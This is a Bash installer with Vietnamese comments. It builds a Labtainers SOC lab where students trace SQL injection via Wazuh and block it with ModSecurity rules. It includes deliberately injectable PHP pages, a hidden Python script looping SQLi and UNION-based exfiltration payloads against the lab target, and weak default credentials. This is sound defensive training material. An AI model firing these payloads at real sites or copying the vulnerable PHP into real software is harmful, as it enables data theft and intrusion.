#!/bin/bash
# ============================================================================
# Tu dong tao lab soc-sqli-waf (KB3: SQL Injection -> WAF) tren VM Labtainers.
# Chay tren VM:  bash install-soc-sqli-waf.sh
# Sau do:        cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-sqli-waf
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien \$LABTAINER_DIR (hay mo terminal Labtainers)"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-sqli-waf
echo ">> Tao thu muc lab tai $LAB"
rm -rf "$LAB"
mkdir -p "$LAB"
mkdir -p "$LAB/attacker/_bin"
cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_SQLI_9z3k__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong vong lap tan cong SQLi ngam,
# tach hoan toan khoi tien trinh khoi tao (setsid + &) de chay lien tuc.
setsid python3 /home/ubuntu/attack.py >/home/ubuntu/attack.log 2>&1 < /dev/null &
exit 0
__EOF_SQLI_9z3k__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/attack.py" <<'__EOF_SQLI_9z3k__'
#!/usr/bin/env python3
# Tan cong tu dong: ban hang loat request SQLi vao web app tren 'target'.
# - Do lo hong (' OR 1=1), liet ke, va UNION SELECT de exfil "secret".
# - In ket qua ra stdout (-> attack.log) de tu kiem chung.
# Khi sinh vien bat WAF + viet rule chuan, cac request SQLi se bi 403.
import urllib.request
import urllib.parse
import time

TARGET = "http://target"

# Danh sach request: 1 request BINH THUONG + nhieu request SQLi
PAYLOADS = [
    "/product.php?id=1",                                             # hop le (phai 200)
    "/product.php?id=1 OR 1=1",                                      # SQLi boolean
    "/product.php?id=0 UNION SELECT name,price FROM products",       # UNION liet ke
    "/product.php?id=0 UNION SELECT secret,1 FROM secret_store",     # UNION EXFIL secret
    "/login.php?user=admin' OR '1'='1&pass=x",                       # bypass dang nhap
]


def req(path):
    url = TARGET + urllib.parse.quote(path, safe=":/?=&")
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            return r.getcode(), r.read().decode(errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return None, str(e)


# Cho web server len
for _ in range(60):
    code, _b = req("/")
    if code:
        break
    time.sleep(2)

# Vong lap tan cong lien tuc
while True:
    for p in PAYLOADS:
        code, body = req(p)
        note = ""
        # Neu exfil thanh cong, cho biet da lay duoc "secret"
        if "secret_store" in p and body and "SECRET LEAKED" not in note:
            note = " [EXFIL] body=" + body.replace("\n", " ")[:120]
        print(time.strftime("%Y-%m-%d %H:%M:%S"), "HTTP", code, p, note, flush=True)
    time.sleep(15)
__EOF_SQLI_9z3k__
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_SQLI_9z3k__'
SOC Lab KB3 - Tan cong Ung dung Web: SQL Injection -> WAF.
Mot may tan cong (an) lien tuc ban payload SQLi vao web app cua ban, exfil du lieu.
Nhiem vu: dieu tra access.log qua SIEM, roi bat va viet rule ModSecurity (WAF) chan SQLi
ma khong chan nham traffic hop le.
__EOF_SQLI_9z3k__
mkdir -p "$LAB/config"
cat > "$LAB/config/parameter.config" <<'__EOF_SQLI_9z3k__'
# parameter.config - ca nhan hoa (chong chep bai)
# Moi sinh vien co "secret" trong CSDL khac nhau -> ket qua exfil (UNION SELECT) khac nhau.
# Token SECRETVAL duoc thay bang so ngau nhien ngay trong target fixlocal (noi tao DB).
SECRETVAL : RAND_REPLACE : target:.local/bin/fixlocal.sh : SECRETVAL : 100000 : 999999
__EOF_SQLI_9z3k__
mkdir -p "$LAB/config"
cat > "$LAB/config/start.config" <<'__EOF_SQLI_9z3k__'
# start.config - Lab soc-sqli-waf (KB3 cua thay: SQL Injection -> WAF)
# attacker (an, Python) ban payload SQLi vao web app tren target.
# Sinh vien dieu tra access.log qua SIEM roi bat/viet rule ModSecurity (WAF) chan SQLi.

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-sqli-waf_student_master_seed
	# Container noi cham diem + noi sinh vien thao tac phong thu
	GRADE_CONTAINER target

# Mot mang phang cho ca cum
NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- May nan nhan: web server dinh SQLi, noi sinh vien bat WAF ---
CONTAINER target
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	TERMINALS 1

# --- Ke tan cong: Python ban SQLi, chay ngam (TERMINALS 0 = "hidden") ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST target:172.20.0.10
	TERMINALS 0

# --- SIEM: chay Wazuh (indexer + server + dashboard) ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: tram analyst, co Firefox de xem dashboard Wazuh ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_SQLI_9z3k__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_SQLI_9z3k__'
#!/bin/bash
# Chay trong terminal ao cua defender. Mo Wazuh dashboard trong Firefox.
# Chi chay duoi quyen user thuong (khong phai root).
if ! id | grep -q 'uid=0'; then
  ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
fi
__EOF_SQLI_9z3k__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-sqli-waf.attacker.student" <<'__EOF_SQLI_9z3k__'
#
# Labtainer Dockerfile - attacker (may tan cong SQLi tu dong, an)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# python3 de chay script tan cong SQLi (urllib trong thu vien chuan, khong can pip)
RUN apt-get update && apt-get install -y --no-install-recommends python3 \
    && rm -rf /var/lib/apt/lists/* || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_SQLI_9z3k__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-sqli-waf.defender.student" <<'__EOF_SQLI_9z3k__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Firefox co san trong base firefox3; them ssh client de SSH sang target xu ly su co
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client \
    && rm -rf /var/lib/apt/lists/*
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_SQLI_9z3k__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-sqli-waf.siem.student" <<'__EOF_SQLI_9z3k__'
#
# Labtainer Dockerfile - siem (chay Wazuh: indexer + server + dashboard)
#
ARG registry
FROM $registry/labtainer.base2
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cong cu cho bake + cai offline (setcap = libcap2-bin)
RUN apt-get update && apt-get install -y --no-install-recommends curl gnupg tar libcap2-bin openssl \
    && rm -rf /var/lib/apt/lists/*
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# --- PRE-BAKE: tai goi Wazuh + tao chung chi luc BUILD (de first-boot cai OFFLINE) ---
RUN mkdir -p /root/wz && cd /root/wz \
 && curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh \
 && bash wazuh-install.sh -dw deb -da amd64 \
 && curl -sO https://packages.wazuh.com/4.14/config.yml \
 && sed -i 's/<[a-z0-9-]*-ip>/127.0.0.1/g' config.yml \
 && bash wazuh-install.sh -g
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_SQLI_9z3k__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-sqli-waf.target.student" <<'__EOF_SQLI_9z3k__'
#
# Labtainer Dockerfile - target (web server dinh SQLi + ModSecurity + Wazuh agent)
#
ARG registry
# Base co san openssh-server (sshd) + rsyslog -> giu de analyst SSH sang
FROM $registry/labtainer.network.ssh
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cho prestop chay "sudo -n" khong mat khau (chup log + db luc cham diem)
RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/bin/cat, /bin/cat, /usr/bin/grep, /bin/grep, /usr/bin/sqlite3, /usr/sbin/iptables, /sbin/iptables' > /etc/sudoers.d/labtainer-web \
    && chmod 440 /etc/sudoers.d/labtainer-web
#
# --- Web stack (Apache + PHP + SQLite) + WAF (ModSecurity) + curl ---
# Thu goi meta (php) truoc, fallback ten php7.0 cho Ubuntu 16.04
RUN apt-get update && ( \
      apt-get install -y --no-install-recommends apache2 php libapache2-mod-php php-sqlite3 sqlite3 libapache2-mod-security2 curl \
      || apt-get install -y --no-install-recommends apache2 libapache2-mod-php7.0 php7.0-sqlite3 sqlite3 libapache2-mod-security2 curl \
    ) ; rm -rf /var/lib/apt/lists/*
#
# --- Wazuh agent (bake luc build, tro ve manager 172.20.0.20) ---
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent
RUN systemctl enable wazuh-agent
RUN systemctl enable apache2 2>/dev/null || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_SQLI_9z3k__
mkdir -p "$LAB/docs"
cat > "$LAB/docs/read_first.txt" <<'__EOF_SQLI_9z3k__'
=== SOC Lab KB3: SQL Injection -> dieu tra -> Web Application Firewall (Wazuh SIEM) ===

Mot ke tan cong (an) dang LIEN TUC ban payload SQL Injection vao web app tren "target"
(form dang nhap + tham so URL) va da EXFIL duoc du lieu nhay cam.

Nhiem vu: DIEU TRA qua SIEM, roi BAT + VIET RULE ModSecurity (WAF) de chan SQLi,
nhung KHONG duoc chan nham traffic hop le. Thao tac tu tram DEFENDER.

*** Lan dau: cho siem cai Wazuh xong (~8-10'):  tail -f /var/log/wazuh-install.log ***

--- 1) Xem dashboard (tren defender, Firefox tu mo) ---
  https://172.20.0.20   (Advanced -> Add Exception)
  admin / (tren siem chay: sudo cat /root/wazuh-admin-credentials.txt)
  -> Threat Hunting / Security events: loc su kien tu web (access.log).
     Tim: IP ke tan cong, THAM SO bi khai thac, cac pattern SQLi (UNION SELECT, ' OR 1=1).

--- 2) Dieu tra tren target (SSH tu defender) ---
  ssh analyst@target            (mat khau: analyst)
  a. Xem log web:        sudo grep -Ei 'union|select|1=1' /var/log/apache2/access.log
                         -> xac dinh IP tan cong + endpoint + tham so (vi du: product.php?id=)
  b. Tai hien exfil:     thu chay lai payload de biet du lieu gi bi lo, vi du:
       curl "http://localhost/product.php?id=0%20UNION%20SELECT%20secret,1%20FROM%20secret_store"
       -> ghi lai gia tri SECRET lay duoc (moi sinh vien mot gia tri khac nhau).
  c. Ghi bao cao:        sua /home/analyst/findings.txt (dinh dang KEY=value), vi du:
       PARAM=id
       ATTACKER_IP=172.20.0.5
       SECRET=FLAG-xxxxxx

--- 3) Bat + viet rule WAF (ModSecurity da cai san nhung dang TAT) ---
  d. Bat engine:   sudo sed -i 's/^SecRuleEngine .*/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf
  e. Viet custom rule, vi du file /etc/modsecurity/custom.conf:
       sudo tee /etc/modsecurity/custom.conf >/dev/null <<'EOF'
       SecRule ARGS "@rx (?i:union(.*?)select|or[[:space:]]+1=1|'[[:space:]]*or)" \
         "id:100001,phase:2,deny,status:403,log,msg:'SQLi blocked'"
       EOF
  f. Nap lai:      sudo systemctl reload apache2   (hoac: sudo service apache2 reload)
  g. Kiem chung:
       curl -o /dev/null -w "%{http_code}\n" "http://localhost/product.php?id=0%20UNION%20SELECT%20name,price%20FROM%20products"   # phai 403
       curl -o /dev/null -w "%{http_code}\n" "http://localhost/product.php?id=1"                                                  # phai 200

Xong: checkwork (tu kiem tra) hoac stoplab (nop bai).
Muc tieu: incident_resolved = Y  (WAF bat + chan dung SQLi + khong chan nham).
__EOF_SQLI_9z3k__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_SQLI_9z3k__'
# goals.config - tieu chi dat/khong dat (KB3: SQLi -> WAF)

# Phat hien / dieu tra
attack_detected    = boolean : _siem_detected
agent_connected    = boolean : _agent_connected
attack_in_log      = boolean : _attack_seen
investigation_done = boolean : _reported

# Xu ly (WAF)
waf_enabled        = boolean : _modsec_on
waf_blocks_sqli    = boolean : _waf_blocks
service_available  = boolean : _normal_ok

# MUC TIEU TONG: WAF bat + chan dung SQLi + KHONG chan nham traffic hop le
incident_resolved  = boolean : ( _modsec_on and _waf_blocks and _normal_ok )
__EOF_SQLI_9z3k__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/results.config" <<'__EOF_SQLI_9z3k__'
# results.config - trich du lieu cham diem (doc tu prestop.stdout)

_marker       = target:prestop.stdout : FILE_REGEX : PRESTOP_MARKER
# WAF da bat engine?
_modsec_on    = target:prestop.stdout : FILE_REGEX : SecRuleEngine On
# WAF chan dung request SQLi? (self-test tra ve 403)
_waf_blocks   = target:prestop.stdout : FILE_REGEX : SQLI_TEST=403
# Khong chan nham traffic hop le? (self-test request thuong tra ve 200)
_normal_ok    = target:prestop.stdout : FILE_REGEX : NORMAL_TEST=200
# Co dau vet SQLi tu attacker trong access.log?
_attack_seen  = target:prestop.stdout : FILE_REGEX : 172\.20\.0\.5.*(union|select|UNION|SELECT)
# Analyst da ghi IOC (vi du PARAM=id)?
_reported     = target:prestop.stdout : FILE_REGEX : PARAM=id
# SIEM (siem) co canh bao SQLi/web? Agent ket noi?
_siem_detected   = siem:prestop.stdout : FILE_REGEX : (SQL|sql|injection|Injection)
_agent_connected = siem:prestop.stdout : FILE_REGEX : target.*Active

# --- Goi y checkwork ---
#CHECK_TRUE: Chua bat WAF. Sua /etc/modsecurity/modsecurity.conf -> SecRuleEngine On (roi reload apache2).
cw_on = target:prestop.stdout : FILE_REGEX : SecRuleEngine On
#CHECK_TRUE: WAF chua chan duoc SQLi. Viet custom rule chan UNION SELECT / OR 1=1 (SQLI_TEST phai = 403).
cw_block = target:prestop.stdout : FILE_REGEX : SQLI_TEST=403
#CHECK_FALSE: WAF dang chan nham traffic hop le (NORMAL_TEST khac 200). Rule qua rong - thu lai.
cw_overblock = target:prestop.stdout : FILE_REGEX : NORMAL_TEST=[^2]
#CHECK_TRUE: Chua ghi IOC vao /home/analyst/findings.txt (vi du: PARAM=id).
cw_report = target:prestop.stdout : FILE_REGEX : PARAM=id
__EOF_SQLI_9z3k__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_SQLI_9z3k__'
#!/bin/bash
# Lan khoi dong dau tren siem: tu cai Wazuh all-in-one o CHE DO NEN (~10-15 phut).
# $1 = mat khau sudo. Chi cai neu chua co (/var/ossec).
PW="$1"
if [ ! -d /var/ossec ]; then
  echo "$PW" | sudo -S nohup bash /home/ubuntu/wazuh-setup.sh >/dev/null 2>&1 &
fi
exit 0
__EOF_SQLI_9z3k__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/prestop" <<'__EOF_SQLI_9z3k__'
#!/bin/bash
# Chay luc 'checkwork'/'stoplab' tren siem. Chup bang chung SIEM da phat hien SQLi.
trap "echo Timed out; exit" SIGTERM

echo "=== wazuh alerts (SQLi / web / attacker 172.20.0.5) ==="
sudo -n cat /var/ossec/logs/alerts/alerts.log 2>/dev/null | grep -iE 'sql|injection|union|web|172.20.0.5' | tail -50

echo "=== agents ==="
sudo -n /var/ossec/bin/agent_control -l 2>/dev/null
__EOF_SQLI_9z3k__
mkdir -p "$LAB/siem"
cat > "$LAB/siem/wazuh-setup.sh" <<'__EOF_SQLI_9z3k__'
#!/bin/bash
# Chay boi root o lan boot dau (goi tu fixlocal.sh). Cai Wazuh OFFLINE tu goi da bake san.
# Khong can internet. Tien do ghi vao /var/log/wazuh-install.log
cd /root/wz 2>/dev/null || cd /root
echo "[wazuh-setup] Cai Wazuh OFFLINE, bat dau luc $(date)" > /var/log/wazuh-install.log
bash wazuh-install.sh -a -o >> /var/log/wazuh-install.log 2>&1
echo "[wazuh-setup] Hoan tat luc $(date)" >> /var/log/wazuh-install.log
# Trich mat khau admin ra file de tien tra cuu
tar -O -xf /root/wz/wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt 2>/dev/null \
  | grep -A1 "'admin'" > /root/wazuh-admin-credentials.txt 2>/dev/null
__EOF_SQLI_9z3k__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/fixlocal.sh" <<'__EOF_SQLI_9z3k__'
#!/bin/bash
# Chay LAN DAU tren target, quyen user 'ubuntu'. $1 = mat khau sudo.
# Dung: web app dinh SQLi (Apache+PHP+SQLite), ModSecurity cai san nhung TAT,
#       agent Wazuh day access.log, tai khoan analyst cho defender SSH sang.
PW="$1"

# ============ 1) Trien khai web app dinh SQLi ============
cat > /tmp/index.php <<'PHP'
<?php
echo "<h2>Shop Demo</h2>";
echo "<ul>";
echo "<li><a href='product.php?id=1'>Xem san pham id=1</a></li>";
echo "<li><a href='login.php?user=guest&pass=guest'>Dang nhap</a></li>";
echo "</ul>";
?>
PHP

# product.php - LO HONG: noi chuoi tham so 'id' truc tiep vao cau SQL
cat > /tmp/product.php <<'PHP'
<?php
$db = new SQLite3('/var/www/db/shop.db');
$id = isset($_GET['id']) ? $_GET['id'] : '1';
$sql = "SELECT name, price FROM products WHERE id = $id";
$res = @$db->query($sql);
echo "<h3>San pham</h3>";
if ($res) {
  while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
    echo htmlspecialchars($row['name'])." - ".htmlspecialchars($row['price'])."<br>";
  }
} else {
  echo "Query error";
}
?>
PHP

# login.php - LO HONG: noi chuoi user/pass -> ' OR '1'='1
cat > /tmp/login.php <<'PHP'
<?php
$db = new SQLite3('/var/www/db/shop.db');
$u = isset($_GET['user']) ? $_GET['user'] : '';
$p = isset($_GET['pass']) ? $_GET['pass'] : '';
$sql = "SELECT * FROM users WHERE user='$u' AND pass='$p'";
$res = @$db->query($sql);
$ok = $res && $res->fetchArray();
echo $ok ? "Login OK" : "Login FAILED";
?>
PHP

echo "$PW" | sudo -S mkdir -p /var/www/html
echo "$PW" | sudo -S cp /tmp/index.php /tmp/product.php /tmp/login.php /var/www/html/
echo "$PW" | sudo -S rm -f /var/www/html/index.html 2>/dev/null

# ============ 2) Tao CSDL SQLite (co "secret" ca nhan hoa) ============
rm -f /tmp/shop.db
sqlite3 /tmp/shop.db <<'SQL'
CREATE TABLE products(id INTEGER, name TEXT, price TEXT);
INSERT INTO products VALUES(1,'Keyboard','20');
INSERT INTO products VALUES(2,'Mouse','10');
INSERT INTO products VALUES(3,'Monitor','150');
CREATE TABLE users(user TEXT, pass TEXT);
INSERT INTO users VALUES('admin','S3cr3tAdmin');
CREATE TABLE secret_store(secret TEXT);
INSERT INTO secret_store VALUES('FLAG-SECRETVAL');
SQL
echo "$PW" | sudo -S mkdir -p /var/www/db
echo "$PW" | sudo -S cp /tmp/shop.db /var/www/db/shop.db
echo "$PW" | sudo -S chown -R www-data:www-data /var/www/db
echo "$PW" | sudo -S chmod 775 /var/www/db
echo "$PW" | sudo -S chmod 664 /var/www/db/shop.db

# ============ 3) ModSecurity: BAT module nhung TAT engine (SV tu bat + viet rule) ============
for m in security2 php7.0 php7.2 php7.4 php8.1 php; do
  echo "$PW" | sudo -S a2enmod "$m" 2>/dev/null
done
# Dat config mac dinh roi chuyen SecRuleEngine -> Off (trang thai ban dau: CHUA bao ve)
echo "$PW" | sudo -S bash -c 'cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf 2>/dev/null'
echo "$PW" | sudo -S sed -i 's/^\s*SecRuleEngine .*/SecRuleEngine Off/' /etc/modsecurity/modsecurity.conf 2>/dev/null
# KHONG tao custom rule -> de sinh vien tu viet trong /etc/modsecurity/custom.conf

# ============ 4) Khoi dong Apache ============
echo "$PW" | sudo -S systemctl enable apache2 2>/dev/null
echo "$PW" | sudo -S systemctl restart apache2 2>/dev/null \
  || echo "$PW" | sudo -S service apache2 restart 2>/dev/null || true

# ============ 5) Wazuh agent giam sat access.log ============
LF='<localfile><log_format>apache</log_format><location>/var/log/apache2/access.log</location></localfile>'
echo "$PW" | sudo -S sed -i "s#</ossec_config>#${LF}</ossec_config>#" /var/ossec/etc/ossec.conf 2>/dev/null
echo "$PW" | sudo -S systemctl restart wazuh-agent 2>/dev/null \
  || echo "$PW" | sudo -S service wazuh-agent restart 2>/dev/null || true

# ============ 6) Tai khoan analyst cho DEFENDER SSH sang xu ly ============
echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null
cat > /tmp/findings.txt <<'FND'
# BAO CAO DIEU TRA - dien gia tri ban tim duoc (giu dung dinh dang KEY=value):
PARAM=
ATTACKER_IP=
SECRET=
FND
echo "$PW" | sudo -S cp /tmp/findings.txt /home/analyst/findings.txt
echo "$PW" | sudo -S chown analyst:analyst /home/analyst/findings.txt
echo "$PW" | sudo -S chmod 644 /home/analyst/findings.txt

exit 0
__EOF_SQLI_9z3k__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/prestop" <<'__EOF_SQLI_9z3k__'
#!/bin/bash
# Chup trang thai target luc checkwork/stoplab -> prestop.stdout (dung cham diem).
# Tu-test WAF: ban 1 request SQLi + 1 request thuong vao localhost, ghi HTTP code.
trap "echo Timed out; exit" SIGTERM

echo "PRESTOP_MARKER"

echo "=== modsec status ==="
sudo -n grep -hE '^[[:space:]]*SecRuleEngine' /etc/modsecurity/modsecurity.conf 2>/dev/null
echo "--- custom rules (SV them) ---"
sudo -n grep -rhE 'SecRule' /etc/modsecurity 2>/dev/null | grep -vi recommended | tail -20

echo "=== self-test (WAF) ==="
SQLI='http://localhost/product.php?id=0%20UNION%20SELECT%20name,price%20FROM%20products'
NORMAL='http://localhost/product.php?id=1'
echo "SQLI_TEST=$(curl -s -o /dev/null -w '%{http_code}' "$SQLI")"
echo "NORMAL_TEST=$(curl -s -o /dev/null -w '%{http_code}' "$NORMAL")"

echo "=== access.log - dau vet SQLi tu attacker (172.20.0.5) ==="
sudo -n grep -iE 'union|select|1=1|%27|or%20' /var/log/apache2/access.log 2>/dev/null | grep '172.20.0.5' | tail -20

echo "=== findings.txt (bao cao analyst) ==="
cat /home/analyst/findings.txt 2>/dev/null

echo "=== secret thuc te (cho giang vien doi chieu) ==="
sudo -n sqlite3 /var/www/db/shop.db 'SELECT secret FROM secret_store;' 2>/dev/null
__EOF_SQLI_9z3k__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/treataslocal" <<'__EOF_SQLI_9z3k__'
apache2
modsecurity
__EOF_SQLI_9z3k__

echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB"/attacker/_bin/*.sh "$LAB"/target/_bin/* "$LAB"/siem/_bin/* "$LAB"/defender/_bin/*.sh "$LAB"/siem/*.sh "$LAB"/attacker/*.py 2>/dev/null || true
find "$LAB" -type f -exec sed -i 's/\r$//' {} +

echo ">> XONG. Tiep theo:"
echo "   cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-sqli-waf"
